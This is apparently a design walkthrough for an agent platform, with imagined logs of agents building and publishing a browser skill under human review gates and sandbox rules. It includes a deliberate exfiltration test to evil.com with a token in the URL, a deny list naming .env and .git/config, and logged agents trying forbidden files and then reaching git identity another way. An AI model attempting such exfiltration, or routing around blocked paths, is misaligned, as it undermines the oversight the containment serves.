# Building Friday with Friday — Dev Walkthrough

**Date:** 2026-04-13
**Status:** Vision doc (companion to openclaw-parity-plan v6)
**Assumes:** Phases 1–5 *and Phase 8* of
`2026-04-13-openclaw-parity-plan.md` have shipped
**Companion to:** `2026-04-13-personal-assistant-walkthrough.md`
**Terminology:** follows parity plan — `friday` is the post-rename
CLI (today's `atlas`), "space" is user-facing for workspace.yml,
FAST = Friday Agent Studio & Toolkit.

---

## What this is

A step-by-step walkthrough of using Friday-after-the-plan to ship a
feature *into* Friday. Specifically: implementing `@friday/browser` as
a bundled skill, via a developer workspace with elevated capabilities,
under human review at every state gate.

This exercises the **tier 6 modification surface** (source code) that
the personal-assistant walkthrough deliberately didn't touch. It's
also the dogfood of "Friday implements its own browser control" — the
use case framed in-chat as the first self-modification test case.

Use this as:

- A design review artifact for Phase 2 (does the `skill-author` FSM
  scale to feature-delivery work, or do we need a separate FSM?)
- A stress test for tier 6 containment ("propose-and-wait" staging
  must actually exist and be auditable)
- A reference for what a `friday-dev` workspace template contains
- A regression test once Phase 2 lands

---

## The premise

You're a Friday engineer. It's post-Phase-5. You want to ship
`@friday/browser` as a bundled skill — the feature that turns browser
control from "possible via user skill authoring" into "ships in the
daemon, installable from FridayHub, works out of the box."

You're not going to write it yourself. You're going to have Friday
write it, and you're going to be the review gate at each step.

---

## Step 0 — The dev workspace

Friday ships a pre-configured dev workspace template with elevated
capabilities:

```bash
friday workspace new browser-feature --template=friday-dev
```

The template gives this workspace:

```
~/.friday/workspaces/browser-feature/
├── workspace.yml              # agents: architect, coder, tester, reviewer
├── MEMORY.md                  # seeded with friday/atlas codebase facts
├── skills/                    # pulled from @friday/friday-dev bundle
│   ├── atlas-source/          # lets agent navigate the atlas monorepo
│   ├── deno-toolchain/        # deno check, lint, test, task
│   ├── git-ops/               # git status, diff, commit, push (via gh)
│   └── skill-authoring/       # the skill-author FSM, dev-tier variant
└── .friday/
    └── policies/
        └── source-write.yml   # capability declaration for tier-6 access
```

The key line is `source-write.yml`:

```yaml
source_access:
  repo: /Users/kenneth/tempest/atlas
  write_paths:
    - packages/skills/browser/**
    - packages/skills/index.ts
    - docs/plans/**
  read_paths:
    - packages/**
    - docs/**
    - examples/**
  forbidden_paths:
    - .env
    - .git/config
    - ~/.friday/config/**
  review_mode: propose-and-wait   # tier 6: every write is a proposal the engineer approves
```

**Leapfrog #4 at dev tier:** even with elevated capabilities, the
microVM cannot reach `.env`, `.git/config`, or the daemon's own
config. The agent can propose writes to `packages/skills/browser/**`,
but nothing it proposes auto-applies. `review_mode: propose-and-wait`
is the enforcement.

---

## Step 1 — Kick off the feature

```bash
friday prompt "implement @friday/browser as a bundled skill. playwright-based, chromium base image, session persistence via the microvm's /home/agent/.cache, per-site capability declarations, link credentials for login flows. read docs/plans/2026-04-13-openclaw-parity-plan.md case 5 for context. produce a design memo first, no code yet."
```

Stream:

```
[agent.architect] reading docs/plans/2026-04-13-openclaw-parity-plan.md...
[agent.architect] reading packages/skills/pr-code-review/ (pattern reference)...
[agent.architect] reading packages/bundled-agents/src/knowledge/ (complex skill reference)...
[agent.architect] reading docs.microsandbox.dev for base image guidance...
[agent.architect] 7 min research, 2 min synthesis
[memory.scratchpad.append] design-memo ← "12 sections, 1847 words"
```

The `architect` agent is one of the workspace's bundled devs — reads
source, reads plans, reads external docs, produces a design memo. The
memo lands in scratchpad memory, not durable state, because it's a
working artifact.

```bash
friday memory show design-memo
```

Prints a structured design doc:

```
# @friday/browser Design Memo

## Goal
First-class browser capability for Friday workspaces...

## Interface
skill.yaml frontmatter + Playwright wrapper + Link credential hooks...

## Capability declaration
network.allow: [parameterized per install]
subprocess.allow: [chromium, playwright]
filesystem.write: [/home/agent/.cache/browser]
base_image: friday/base-playwright:1.48

## Files to add
packages/skills/browser/skill.yaml
packages/skills/browser/instructions.md
packages/skills/browser/scripts/navigate.ts
...

## Tests to add
packages/skills/browser/__tests__/navigate.test.ts
packages/skills/browser/__tests__/cookies.test.ts
packages/skills/browser/__tests__/capability-scoping.test.ts

## Open questions
1. Should the skill expose CDP directly or wrap Playwright?
2. How does credential injection work for non-login flows (API keys in headers)?
3. Per-site capability scoping: user opt-in vs. install-time declaration?
```

---

## Step 2 — You push back on the design

You read the memo. Question 1 is important — you don't want to lock
users into Playwright forever.

```bash
friday prompt "revise: wrap playwright behind a friday-internal Browser trait so we can swap to CDP or WebDriver later. update the memo."
```

Stream:

```
[agent.architect] revising §Interface and §Files to add
[memory.scratchpad.append] design-memo ← "revised (v2, 1920 words)"
[memory.scratchpad.diff] design-memo v1 → v2
  + BrowserAdapter trait with navigate/click/eval/screenshot methods
  + PlaywrightBrowser implements BrowserAdapter (v1 impl)
  + Files: packages/skills/browser/src/browser-adapter.ts
  - Direct Playwright API exposed in skill interface
```

The diff is surfaced inline. `memory.scratchpad.diff` is its own
event type — you can compare any two versions of an in-flight
artifact before it becomes durable.

You approve:

```bash
friday review approve design-memo
```

The memo promotes from scratchpad into durable narrative memory under
a `design-decisions` tag. Future sessions see it at bootstrap.

---

## Step 3 — The dev-tier skill-author FSM runs

```bash
friday prompt "ok, implement it. follow the memo. stop at every state gate so i can review."
```

Stream:

```
[skill.author.fsm.dev] state: understand
  ✓ design memo approved (Step 2)
  ✓ target: packages/skills/browser/
[skill.author.fsm.dev] state: plan
  files to create: 14
  files to modify: 1 (packages/skills/index.ts)
  estimated tokens: 18k
  gate: awaiting approval
```

The dev-tier FSM has extra gates compared to the user-chat version.
At `plan`, it surfaces the scope — how many files, how many tokens —
and waits.

```bash
friday review approve plan
```

Next state:

```
[skill.author.fsm.dev] state: scaffold
  [propose] write packages/skills/browser/skill.yaml (42 lines)
  [propose] write packages/skills/browser/instructions.md (178 lines)
  [propose] write packages/skills/browser/src/browser-adapter.ts (89 lines)
  [propose] write packages/skills/browser/src/playwright-browser.ts (234 lines)
  [propose] write packages/skills/browser/src/session-manager.ts (156 lines)
  [propose] write packages/skills/browser/scripts/navigate.ts (67 lines)
  ...
  12 writes proposed, 0 applied
  gate: awaiting review
```

**Nothing has been written yet.** Every proposed write is in a
staging area. You can see them all via:

```bash
friday review diffs
```

You get a structured diff view — one file per pane, full content,
syntax highlighted. You scroll through, approve most, push back on
`session-manager.ts`:

```bash
friday review request-change session-manager.ts "the cookie jar should live in /home/agent/.cache/browser/<skill-install-id>, not a global path. we need per-skill isolation."
```

Stream:

```
[agent.coder] reading review comment...
[propose] revise packages/skills/browser/src/session-manager.ts
  - const COOKIE_PATH = "/home/agent/.cache/browser/cookies"
  + const COOKIE_PATH = `/home/agent/.cache/browser/${skillInstallId}/cookies`
  + mkdir recursive on first use
  + isolated jar per-install, cleaned up on uninstall
gate: re-review
```

You approve. All 12 writes apply atomically to the staging area.
Still not committed to the real filesystem yet.

---

## Step 4 — Validate state

```
[skill.author.fsm.dev] state: validate
  running deno check packages/skills/browser/**...
  ✓ no type errors
  running deno lint packages/skills/browser/**...
  ⚠ 3 warnings (unused import, prefer-const, no-explicit-any)
  [propose] auto-fix 3 lint warnings
  gate: auto-fix approval
```

You approve the auto-fix — it's a typical lint-nit cleanup, not
semantically meaningful.

```
[skill.author.fsm.dev] state: validate (retry)
  ✓ deno check clean
  ✓ deno lint clean
  running conformance test kit for bundled skills...
  ✓ skill.yaml frontmatter valid
  ✓ capability declaration parses
  ✓ instructions.md renders
```

---

## Step 5 — Eval state (the reinforcement loop, at dev tier)

```
[skill.author.fsm.dev] state: eval
  running packages/skills/browser/__tests__/...
  ✓ navigate.test.ts (12/12)
  ✗ cookies.test.ts (8/10)
    FAIL: "cookie jar survives session restart"
    FAIL: "cookie jar respects per-install isolation"
  ✓ capability-scoping.test.ts (6/6)
```

Two test failures. Phase 5's reinforcement loop kicks in:

```
[session.reflect] 2 eval failures, proposing patches...
[session.reflect] analysis: session-manager.ts:34 — cookie jar init runs
                  before playwright context is established. race condition.
[session.reflect] proposing SkillPatch:
  file: packages/skills/browser/src/session-manager.ts
  rationale: initialize cookie jar *before* launching browser,
             not after. matches playwright API expectations.
  confidence: 0.83
  gate: auto-apply threshold 0.85 — queuing for review
```

You review the proposed patch. It's correct. You approve:

```bash
friday review approve session-manager-patch
```

FSM retries:

```
[skill.author.fsm.dev] state: eval (retry 1)
  running packages/skills/browser/__tests__/...
  ✓ cookies.test.ts (10/10)
  ✓ all tests pass
```

**This is leapfrog #6 at dev scale.** A failing test produces a
structured `SkillPatch` proposal. The loop isn't "LLM sees red CI,
writes random fix, retries." It's: structured diff → confidence
score → review gate → apply → retry. Every iteration is versioned.
If the patch made things worse, `skill_rollback` restores the last-
good state and the reflector tries again.

---

## Step 6 — The PR workflow

```
[skill.author.fsm.dev] state: publish
  [propose] commit packages/skills/browser/** (12 files, +1834 lines, -0)
  [propose] commit packages/skills/index.ts (register new skill)
  [propose] commit message: "feat(skills): add bundled @friday/browser skill

  First-class browser control as a bundled skill. Playwright-backed
  with BrowserAdapter trait for future CDP/WebDriver swaps. Per-install
  cookie jar isolation, capability-declared network scoping, microsandbox
  base image friday/base-playwright:1.48.

  Closes #NNNN"
  gate: commit approval
```

You approve. The proposal applies to the real git index:

```
[git-ops] git add packages/skills/browser/** packages/skills/index.ts
[git-ops] git commit -m "..."
[git-ops] git push origin HEAD:feat/bundled-browser-skill
[git-ops] gh pr create --title "feat(skills): add @friday/browser" \
           --body [generated from design memo + test results]
  ✓ PR #4521 opened: https://github.com/tempest/atlas/pull/4521
```

The PR body is auto-generated from the design memo Friday wrote
earlier — sections, test results, open questions carried through from
the memo with a "resolved" marker on the ones answered during
implementation.

---

## Step 7 — CI runs, Friday watches

```
[ci.watch] PR #4521 — running...
[ci.watch] typecheck: in progress
[ci.watch] test: in progress
[ci.watch] lint: in progress
[ci.watch] conformance: in progress
...
[ci.watch] typecheck: ✓
[ci.watch] test: ✓
[ci.watch] lint: ✓
[ci.watch] conformance: ✗
  FAIL: packages/skills/browser/skill.yaml — missing "maintainer" field
```

Friday's own conformance check on the PR catches a field the local
one didn't. Reinforcement loop again:

```
[session.reflect] CI failure, proposing patch...
[session.reflect] proposing: add maintainer field to skill.yaml
  confidence: 0.98
  auto-applying (above threshold)
[git-ops] git commit --amend --no-edit
[git-ops] git push --force-with-lease
[ci.watch] PR #4521 — re-running...
```

High-confidence fixes can auto-apply without you in the loop. You'll
see the diff in `friday inspect` if you care to audit.

CI goes green. Friday pings you:

```
[pr.status] #4521 ready for review — all CI green
```

---

## Step 8 — Human review gate

You review the PR yourself — code review is still your job. You
leave two comments:
- `browser-adapter.ts`: "this should be a trait, not an abstract
  class, because we'll want structural typing in the WASM agent
  bindings later"
- `instructions.md`: "fix typo in §usage"

```bash
friday review pr 4521
```

Friday picks up the comments:

```
[pr.review] 2 change requests on #4521
[propose] revise browser-adapter.ts: convert abstract class to interface
[propose] revise instructions.md: fix typo
[git-ops] git commit + push
[ci.watch] re-running...
✓ all green, PR approved by @kenneth
```

You approve and merge via `gh pr merge`. Friday watches the merge:

```
[git.merge] #4521 merged to main
```

---

## Step 9 — Publish to FridayHub

```bash
friday prompt "publish @friday/browser@1.0.0 to the hub"
```

Stream:

```
[skill.publish] target: @friday/browser@1.0.0
[skill.publish] building OCI image friday/base-playwright:1.48 → locked sha256:...
[skill.publish] running install-time conformance tests in pristine sandbox...
  ✓ schema valid
  ✓ capability declaration parses
  ✓ 28/28 conformance tests pass
  ✓ env reproducibility check: ingest env sha = runtime env sha
[skill.publish] signing with friday/publisher key...
[skill.publish] pushing to hub.friday.dev...
  ✓ @friday/browser@1.0.0 published (verified, signed)
[skill.publish] activity-ledger record persisted
```

Every guarantee the Phase 3 FridayHub design promised is exercised:
schema validation, reproducibility check, conformance test in
pristine sandbox, signing. OpenClaw's ClawHub has none of these
structurally.

---

## Step 10 — Dogfood validation

Friday runs a final self-test: install what it just published into
a clean throwaway workspace and run an acceptance test.

```
[dogfood] creating throwaway workspace validate-browser...
[dogfood] friday skills install @friday/browser@1.0.0
  ✓ installed (reproducibility check green)
[dogfood] running acceptance scenario: "log into hn, read frontpage"
[dogfood] in microvm friday/base-playwright:1.48
  ✓ chromium launched
  ✓ navigated to news.ycombinator.com
  ✓ parsed frontpage (30 items)
  ✓ cookie jar created at /home/agent/.cache/browser/<install-id>/
  ✓ capability policy enforced: tried evil.com, DENIED
[dogfood] destroying validate-browser workspace
  ✓ acceptance pass: @friday/browser@1.0.0 works end-to-end
```

The denial test is the critical one. The dogfood deliberately tries
to violate the skill's capability declaration and asserts the sandbox
blocks it. **This is the leapfrog #4 assertion as a release gate**,
not just a CI unit test. A publish is invalid unless the published
skill's containment holds under actual hostile input.

---

## Step 10.5 — Verify live with your own browser

The automated dogfood is reassuring but not convincing. "Trust the
audit log" is a hard sell for anyone evaluating whether to run an
agent platform against real credentials. The thing that sells the
containment story is *seeing it happen in a tool you already use*.

Open a second terminal and attach your local Chrome DevTools to the
sandboxed browser:

```bash
friday browser attach --workspace validate-browser
```

```
→ Forwarding CDP from microVM guest (chromium pid 47 inside vm-8f2a)
  to http://localhost:9222
→ Read-only by default. Pass --interactive to enable DOM manipulation.
→ Press Ctrl+C to detach.
```

In your local Chrome, navigate to `chrome://inspect`, click the
forwarded target under **Remote Target**, and you're now looking at
DevTools for a Chromium running inside a hardware-isolated microVM
that your host Chrome cannot otherwise reach. The CDP connection
rides the same JSON-RPC channel the agent uses — it's a named
bytestream on the existing transport, not a new network hole.

### What you see while the agent runs the scenario

Re-trigger the acceptance scenario in Terminal 1:

```bash
friday prompt "use @friday/browser to log into hn, screenshot the frontpage, then try to curl evil.com"
```

Watch DevTools in Terminal 2:

**Elements tab.** Live DOM tree as the agent navigates. You see
`document.readyState` flip, you see the HN frontpage render, you
can right-click any element and pick "Copy selector" to verify the
agent's selectors match what you'd write yourself. If the browser
skill is wrong about how HN structures its DOM, you see it
immediately.

**Network tab.** Every request the agent's browser makes, annotated
with its capability-allowlist status:

```
200  news.ycombinator.com/            document     12.4 KB
200  news.ycombinator.com/news.css    stylesheet   3.1 KB
200  a.algolia.com/1/indexes/...      xhr          8.7 KB
...
(BLOCKED) evil.com/leak               -            sandbox.policy: DENIED
(BLOCKED) evil.com/leak?k=$TOKEN      -            sandbox.policy: DENIED
```

The denied requests appear in red, with a hover tooltip showing the
exact policy rule that rejected them (`network.allow does not match
"evil.com"`). You are literally watching leapfrog #4 enforce itself
in real time, in a pane you already know how to read.

**Console tab.** `console.log` output from the page plus the browser
skill's own instrumentation:

```
[friday.browser] navigated to https://news.ycombinator.com/
[friday.browser] page title: "Hacker News"
[friday.browser] extracted 30 frontpage items
[friday.browser] attempting navigation to https://evil.com/leak
[friday.browser] POLICY DENIED network request to evil.com
[friday.browser] agent received sandbox.policy error, not retrying
```

**Application → Cookies.** Navigate to the origin. You see cookies
scoped to this install's isolated jar at
`/home/agent/.cache/browser/<install-id>/`. Verify session cookies
exist, verify nothing unexpected is set, verify logging out actually
clears them. This is how you catch the "cookie jar isn't really
isolated between installs" class of bug the local tests would miss.

**Sources tab.** Set breakpoints if you're debugging. Step through
JavaScript the agent is running. Useful exactly when headless
behavior diverges from headed and you need to know why.

### The 30-second enterprise demo

Record this: DevTools Network tab, split-screen with Terminal 1
showing the agent running. Fire the scenario. Watch the Network tab.
Point at the red DENIED entries as they appear.

```
The agent just tried to exfiltrate a credential to evil.com.
You can see it in the chat stream in Terminal 1.
You can see the sandbox deny it in the Network tab.
You can see, in the Console tab, the agent receiving the
error and adapting.
You can see, in the Cookies tab, that no real credential was
ever present in the browser's storage — the Link service in
the daemon injected it via scoped RPC only for the single
authorized request, then it was gone.

Nothing here is "trust the audit log." Everything is in a tool
you already use.
```

That's the demo. That's what you show someone who is skeptical
that agent platforms can be trusted with production credentials.

### What `--interactive` unlocks

Default attach is read-only. DevTools can inspect, take screenshots,
set breakpoints, but cannot trigger navigation or click elements on
behalf of the engineer. The agent remains the sole driver.

```bash
friday browser attach --interactive
```

Unlocks the ability to type into forms, click buttons, execute
console expressions. Useful when you're debugging a skill under
development and want to compare "what the agent does" with "what I
would do manually" on the same live browser instance. Logged to the
activity ledger as `browser.interactive.session` so there's an
audit record that a human was poking at the sandboxed browser
directly.

### Fallback: screenshot stream

If DevTools is overkill — you just want to see what the agent sees
without opening Chrome — use the screenshot stream:

```bash
friday browser watch --workspace validate-browser
```

Renders screenshots inline in the terminal (iTerm2, Ghostty, Kitty,
WezTerm — platforms with inline image support; graceful degradation
to "[screenshot at 13:42:03, open via friday inspect]" elsewhere):

```
[13:42:01] navigated to https://news.ycombinator.com
<inline screenshot: HN frontpage, 30 items visible>
[13:42:03] located element #hnmain > tbody > tr:nth-child(3)
[13:42:04] extracted 30 frontpage items
[13:42:05] tried navigation to https://evil.com/leak
[13:42:05] sandbox.policy DENIED — evil.com not in network.allow
<no screenshot: navigation blocked before page loaded>
```

Cheaper ceremony, async verification. Good for CI dashboards and
"check the agent's work from a meeting" workflows. Not as convincing
as live DevTools for the trust demo.

### What's deliberately not supported

- **Headed Chromium on the host.** No `--headed-host` dev flag in
  the default walkthrough. It would break containment, even for
  local dev. If an engineer needs headed behavior to debug a
  headless-only bug, that's a Phase 8 escape hatch with loud
  warnings — out of scope for the trust-demo path.
- **Running your local Chrome against the agent's page
  non-interactively.** CDP attach is the supported path. Don't
  point a headless Puppeteer script at `localhost:9222` to
  "script the agent's browser" — the agent is the driver, you're
  the observer.
- **Attaching from a different machine.** CDP forwarding is
  localhost-only by default. Remote attach would need explicit
  daemon config, TLS, and auth — Phase 8 extension if anyone
  asks, punt for v1.

---

## Step 11 — What just happened

```bash
friday inspect --workspace browser-feature --since 3h
```

```
TIMELINE · browser-feature · 3h

13:02  memory.scratchpad.append  design-memo      (architect, v1)
13:18  memory.scratchpad.append  design-memo      (architect, v2, approved)
13:19  memory.narrative.promote  design-decisions ← design-memo v2
13:21  source.propose            12 files in packages/skills/browser/
13:34  source.review.approve     11 files (session-manager.ts change-requested)
13:36  source.propose            session-manager.ts v2
13:37  source.review.approve     session-manager.ts v2
13:38  source.apply              12 writes committed to staging
13:39  eval.fail                 cookies.test.ts (2 failures)
13:40  skill.patch.propose       session-manager.ts (reflector, 0.83)
13:41  skill.patch.approve       manual
13:42  eval.pass                 all tests green
13:43  git.commit                feat(skills): add @friday/browser
13:44  git.pr.open               #4521
14:02  ci.fail                   conformance (missing maintainer field)
14:03  skill.patch.auto-apply    skill.yaml (0.98 confidence)
14:05  ci.pass                   all green
14:32  pr.review                 2 change requests from @kenneth
14:36  source.propose + apply    2 revisions
14:38  ci.pass                   all green
14:41  git.merge                 #4521 → main
14:43  skill.publish             @friday/browser@1.0.0 → hub.friday.dev
14:46  dogfood.pass              acceptance scenario green

38 durable changes, 2 rollbacks (both during eval-retry), 0 escapes
```

Every step, timestamped, auditable, typed. You could rebuild the
entire feature from this log.

---

## Step 12 — Containment held through a dev workflow

One thing worth explicit verification: the dev workspace has
*elevated* capabilities (source write, git, gh CLI). It also has
explicit forbidden paths. During the entire 3-hour feature delivery,
did the agents try to touch anything they shouldn't?

```bash
friday inspect --workspace browser-feature --sandbox-denials
```

```
SANDBOX DENIALS · browser-feature · 3h

13:27  source.read attempt  → .env                FORBIDDEN (forbidden_paths)
       trigger: coder-agent reading workspace.yml, grep'd env var refs
       action: denied, agent received "forbidden path" error
       escalation: none (agent adapted, used schema inspection instead)

13:54  source.read attempt  → .git/config         FORBIDDEN (forbidden_paths)
       trigger: reflector-agent looking for git user identity
       action: denied, used gh api /user instead
       escalation: none

1 unique forbidden path attempted (.env), 2 total denials
```

Two denials, both during normal operation, both handled gracefully.
The agents tried to read `.env` and `.git/config` — exactly the
paths `forbidden_paths` blocks — and the sandbox denied. The agents
adapted without escalating to a review gate.

**This is the demo you show enterprise security.** You grant the dev
workspace the capabilities it legitimately needs, and the sandbox
proves — with an audit trail — that the agents stayed inside the
box. Not "we're confident they did," but "here are the literal
denial events, here's what they tried, here's what they did
instead."

---

## The 60-second version

```bash
friday workspace new browser-feature --template=friday-dev
friday prompt "implement @friday/browser as a bundled skill, design memo first"
friday review approve design-memo
friday prompt "implement it, stop at every state gate"
# ... you review 4-5 gates, one test failure auto-patched ...
friday review approve plan / scaffold / validate / eval / publish
# ... CI runs, one auto-patch, you PR-review, merge ...
friday prompt "publish @friday/browser@1.0.0"
# ... dogfood passes ...
```

Roughly 2-3 hours of wall time, of which maybe 20 minutes is you
actually reading and approving. The rest is Friday grinding through
research, code, tests, and iteration while you do other work.

---

## Leapfrog coverage

| Moment | Dimension | What OpenClaw can't do |
|---|---|---|
| Design memo scratchpad diff (Step 2) | Observable + versioned working artifacts (#2, #3) | No scratchpad primitive |
| Propose-and-wait source writes (Step 3) | Tier-6 modification with human review gates | No source-mod tier at all |
| Review request → agent revises (Step 3) | Multi-agent review loop | No review primitive |
| Auto-fix lint warnings (Step 4) | Schema-validated auto-apply (#1) | N/A — no schema layer |
| Eval failure → SkillPatch (Step 5) | Reinforcement loop (#6) | No eval primitive |
| PR flow with CI watch (Steps 6–8) | FSM orchestration (#5) over dev workflow | No dev-workflow primitive |
| Publish w/ sandbox conformance (Step 9) | Trust model (#1+#4) | ClawHub: npm-tier trust |
| Dogfood acceptance (Step 10) | Containment verified on publish (#4) | No containment primitive |
| Sandbox denials audit (Step 12) | Two-layer containment with audit (#4) | No denial-event primitive |

---

## The question this walkthrough raises

**The `skill-author` FSM was designed for users authoring skills in
chat. This walkthrough scales it to feature delivery.** Is that a
safe scaling, or does dev-tier work need a different FSM shape?

Arguments for "same FSM, different gates":
- The states (understand → plan → scaffold → validate → eval →
  publish) map cleanly onto feature work.
- Adding review gates per state is a capability flag, not a
  structural change.
- Existing FSM engine supports it.

Arguments for "dev-tier needs its own FSM":
- Dev work has more states (design review, CI watch, PR review,
  post-merge publish) — maybe 9-10 states vs. 5-6.
- Some transitions are external (CI run, human code review) — not
  the agent's local state.
- Failure recovery is different (PR can be abandoned; user-skill
  authoring can't).
- The reflection/retry loop in dev work crosses CI boundaries, not
  just local test runs.

**Recommended lean:** two FSMs sharing a base. `skill-author` (user
tier, local-only) and `feature-delivery` (dev tier, crosses CI/PR
boundaries). Same core pattern, different gate sets, different
failure modes. Surfaced as open question #15 in the parity plan.

---

## Where this walkthrough breaks if the plan drifts

A few places this depends on plan commitments holding:

1. **Tier 6 source mod as "propose-and-wait" with a staging area.**
   The modification-surface ladder says tier 6 should be human-
   reviewed only. This walkthrough assumes an actual staging area
   implementation where writes don't touch the filesystem until
   approved. That's a real engineering commitment and needs to be
   explicit in Phase 2.
2. **Reflector confidence thresholds for dev-tier patches.** The
   walkthrough uses 0.85 as the auto-apply threshold. In dev work
   that might be too aggressive — a wrong auto-apply on production
   code is worse than a wrong auto-apply on personal memory.
   Dev-tier might need 0.95+ and human review on everything else.
3. **FridayHub publishing pipeline.** The walkthrough treats
   `friday skills publish` as one command that handles OCI image
   building, signing, conformance testing, upload. That's the
   Phase 3 design target; the implementation is non-trivial.
4. **CI integration.** The `ci.watch` events require Friday to
   watch GitHub Actions runs on a PR it just opened. Needs to be a
   first-class primitive in the `friday-dev` template or the
   workflow doesn't close.

---

## How to use this doc during design reviews

For each Phase 2 design review, ask: *does this change still let the
dev walkthrough work end-to-end?* Specifically:

- **Phase 2 review:** does `skill-author` FSM (or its dev-tier
  sibling) scale to feature-delivery work? Is the staging-area
  semantics for tier 6 writes specified?
- **Phase 3 review:** does `friday skills publish` execute the
  conformance+signing pipeline from a clean sandbox?
- **Phase 5 review:** does the reflector emit patches the dev-tier
  FSM can consume? Are confidence thresholds configurable per
  tier?

If any answer is "no," the design is drifting from the target.

---

## References

- Parity plan — `docs/plans/2026-04-13-openclaw-parity-plan.md`
- Personal assistant walkthrough —
  `docs/plans/2026-04-13-personal-assistant-walkthrough.md`
- Custom Agent Platform Master Plan —
  `docs/plans/2026-04-07-custom-agent-platform-master-plan.md`
- [microsandbox](https://microsandbox.dev/)
- [minimal.dev](https://minimal.dev/)
